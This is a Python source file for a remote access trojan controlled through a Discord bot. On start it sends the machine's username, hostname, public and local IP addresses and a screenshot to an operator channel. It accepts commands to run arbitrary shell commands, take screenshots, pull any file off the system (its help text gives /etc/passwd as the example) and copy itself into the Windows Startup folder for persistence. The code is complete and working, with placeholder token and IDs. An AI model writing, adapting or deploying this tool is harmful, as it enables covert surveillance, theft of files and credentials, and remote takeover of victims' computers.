import os
import shutil
import sys
import pyautogui
import subprocess
import random
import discord
import platform
import psutil
import socket
import getpass
import requests
from discord.ext import commands

allowed_user_ids = ['111111111111111111']  # Allowed User ID
channel_id = 11111111111111111111  # Allowed Channel ID

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)


def get_local_ipv4_addresses():
    local_ipv4_addresses = []
    try:
        # Get all network interfaces and their addresses
        if platform.system() == 'Windows':
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        local_ipv4_addresses.append(addr.address)
        elif platform.system() == 'Linux':
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
                        local_ipv4_addresses.append(addr.address)
    except Exception as e:
        print(f"Error getting local IPv4 addresses: {e}")
    return local_ipv4_addresses


def take_screenshot(filename='screenshot.png'):
    take_screenshot = pyautogui.screenshot()
    take_screenshot.save(filename)
    return filename


def get_system_info():
    system_info = {'platform': platform.system(), 'username': getpass.getuser(), 'machine_name': socket.gethostname()}

    try:
        public_ip = requests.get('https://ifconfig.co/ip').text.strip()
        system_info['public_ip'] = public_ip
    except requests.RequestException:
        system_info['public_ip'] = 'Failed to retrieve'

    system_info['processor'] = platform.processor()
    system_info['architecture'] = platform.architecture()
    system_info['machine'] = platform.machine()

    # Memory information
    mem = psutil.virtual_memory()
    system_info['total_memory'] = mem.total / (1024 ** 3)  # Convert bytes to GB
    system_info['available_memory'] = mem.available / (1024 ** 3)  # Convert bytes to GB

    # Disk information
    disk = psutil.disk_usage('/')
    system_info['total_disk'] = disk.total / (1024 ** 3)  # Convert bytes to GB
    system_info['used_disk'] = disk.used / (1024 ** 3)  # Convert bytes to GB
    system_info['free_disk'] = disk.free / (1024 ** 3)  # Convert bytes to GB

    # Local IPv4 addresses
    system_info['local_ipv4_addresses'] = get_local_ipv4_addresses()

    formatted_string = ""
    for key, value in system_info.items():
        if isinstance(value, list):
            value_str = ', '.join(value)
            formatted_string += f"{key}: {value_str}\n"
        elif isinstance(value, float):
            formatted_string += f"{key}: {value:.2f} GB\n"
        else:
            formatted_string += f"{key}: {value}\n"
    return formatted_string


async def send_msg(channel, title, msg):
    embed = discord.Embed(title=title, description=msg, color=random.randint(0, 0xFFFFFF))
    embed.set_thumbnail(url='https://th.bing.com/th/id/OIG4.k_5NdtV_0KGMvB3OGtd_?pid=ImgGn')
    await channel.send(embed=embed)


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    channel = bot.get_channel(channel_id)
    if channel:
        await send_msg(channel=channel, title=f'{getpass.getuser()}@{socket.gethostname()}', msg=f'**ALIVE**')
        await send_msg(channel=channel, title='System Information', msg=f'```{get_system_info()}```')
        screenshot_filename = take_screenshot()
        await channel.send(file=discord.File(screenshot_filename))
        os.remove(screenshot_filename)
        # await channel.send(get_system_info())


@bot.command()
async def ping(ctx):
    await send_msg(channel=ctx, title=f'Pong {getpass.getuser()}@{socket.gethostname()} ',
                   msg=f'Hey {ctx.author.name}\nStop harassing me please.')


@bot.command()
async def cmd(ctx, *, command):
    print(f'{ctx.author.name} Sent: {command}')
    if str(ctx.author.id) not in allowed_user_ids:
        await ctx.send("You are not authorized to use this command.")
        return

    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        if len(result) > 1900:
            write_file = 'output.txt'
            with open(write_file, 'w') as f:
                f.write(result)
            try:
                with open(write_file, 'rb') as file:
                    await ctx.send(file=discord.File(file, write_file))
                os.remove(write_file)
            except FileNotFoundError:
                await ctx.send("File not found.")
        elif len(result) == 0:
            await ctx.send(
                '```No output was generated by the command, suggesting that it likely executed an interactive '
                'process.```')
        else:
            await ctx.send(f'```{result}```')
    except subprocess.CalledProcessError as e:
        await ctx.send(f'Command failed with return code: {e.returncode}: ```{e.output}```')


@bot.command()
async def screenshot(ctx):
    screenshot_filename = take_screenshot()
    await ctx.send(file=discord.File(screenshot_filename))
    os.remove(screenshot_filename)


@bot.command()
async def helpme(ctx):
    string = (f'```!cmd - run commands (!cmd whoami)\n!screenshot - take screenshot\n'
              f'!get - get file from system (!get /etc/passwd)\n'
              f'!persist - copy the script to user startup folder (Windows)\n!ping```')
    await ctx.send(string)


@bot.command()
async def get(ctx, *, path):
    await ctx.send(file=discord.File(path))


@bot.command()
async def persist(ctx):
    source_script_path = sys.argv[0]

    if platform.system() == 'Windows':
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    else:
        await ctx.send("Unsupported operating system.")
        return

    destination_script_path = os.path.join(startup_folder, os.path.basename(source_script_path))

    try:
        shutil.copy(source_script_path, destination_script_path)

        if os.path.exists(destination_script_path):
            await ctx.send(f"Script copied to startup folder successfully!\n```{destination_script_path}```")
        else:
            await ctx.send("Failed to copy the script to startup folder.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


bot.run('zzzzzzzzzzzzzzzzzzzzzzz.Qqqq-Q.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')  # Bot Token